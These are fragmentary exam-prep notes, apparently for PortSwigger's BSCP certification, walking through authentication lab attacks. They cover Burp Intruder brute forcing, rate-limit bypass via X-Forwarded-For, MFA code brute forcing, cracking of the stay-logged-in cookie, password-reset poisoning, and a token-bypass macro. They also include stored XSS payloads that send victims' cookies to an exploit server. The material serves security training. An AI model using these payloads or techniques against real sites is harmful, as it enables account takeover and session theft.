**

- Under Grep - Extract, click Add. In the dialog that appears, scroll down through the response until you find the error message Invalid username or password.
    
- Pitchfork attack with X-Forwarded-For header
    
-  Resource pool to open the Resource pool side panel, then add the attack to a resource pool with Maximum concurrent requests set to 1. Add a list of payloads that alternates between your username and carlos. Make sure that your username is first and that carlos is repeated at least 100 times.
    
- Cluster bomb attack. Add a blank payload position to the end of the request body by clicking Add §. The result should look something like this: username=§invalid-username§&password=example§§. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: You have made too many incorrect login attempts. Make a note of this username.
    
- Change the verify cookie to carlos to generate a code for carlos. Brute force using the Intruder the mfa-code for carlos using the POST /login2 request with verify cookie value set to carlos. Open the 302 response in the browser
    
- Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows: base64(username+':'+md5HashOfPassword).  In Burp Intruder, notice that the stay-logged-in cookie has been automatically added as a payload position. Add your own password as a single payload. Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted. Hash: MD5 Add prefix: wiener: Encode: Base64-encodeAs the Update email button is only displayed when you access the My account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the  Settings side panel, add a grep match rule to flag any responses containing the string Update email
    
- stay-logged-in cookie, to see that it is constructed as follows: username+':'+md5HashOfPassword. <script>document.location='//[YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie](http://your-exploit-server-id.exploit-server.net/'+document.cookie)</script>
    
- Modify POST request and add a new header and change username parameter to carlos  X-Forwarded-Host: exploit-lab_id[.exploit-server.net](http://.exploit-server.net) View access log and get the user's token and replace it in the URL [https://lab_id.web-security-academy.net/forgot-password?temp-forgot-password-token=token](https://lab_id.web-security-academy.net/forgot-password?temp-forgot-password-token=token) Reset password and log in
    
- Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states Current password is incorrect. If you enter a valid current password, but two different new passwords, the message says New passwords do not match. In Burp Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. Make sure that the new password parameters are set to two different values. For example: username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc Click  Settings to open the Settings side panel, then add a grep match rule to flag responses containing New passwords do not match. Start the attack.
    
- Stay-Logged-in:
    

Logout as current user.

Send the most recent GET /my-account request to Burp Intruder.

Select the cookie: stay-logged-in as injection position.

Hash: MD5

Add prefix: carlos:

Encode: Base64-encode

Add GREP under settings tab, to check for the string in the response Update email indicating successfully logged in attack.

- Stay-logged-in Offline Crack
   
The blog application comment function is vulnerable to stored XSS, use the below payload in blog comment to send the session cookie of Carlos to the exploit server.

  

<script>

document.location='https://EXPLOIT.net/StealCookie='+document.cookie

</script>

- Subtly Invalid Login - Tip for the BSCP Exam, there is sometimes another user with weak password that can be brute forced. Carlos is not always the account to target to give a foothold access in stage 1.
    
-   
    
- Auth Token bypass Macro
    

If the authentication login is protected against brute force by using random token that is used on every login POST, a Burp Macro can be used to bypass protection.

  

Create Burp Macro

  

Open Proxy settings and select sessions under Project choices.

Scroll down to Macros, and add new macro.

Select request from the list to use for the value to be used.

click Configure item and add custom parameter location to extract.

Click OK to return to Sessions under Project choices.

Add a Session handling rule, and the editor dialogue opens.

In the dialogue, go to the "Scope" tab.

Under scope for the session handling rule editor, check Target, Intruder, and Repeater.

Still under "URL Scope", select Include all URLs.

Close Settings.

**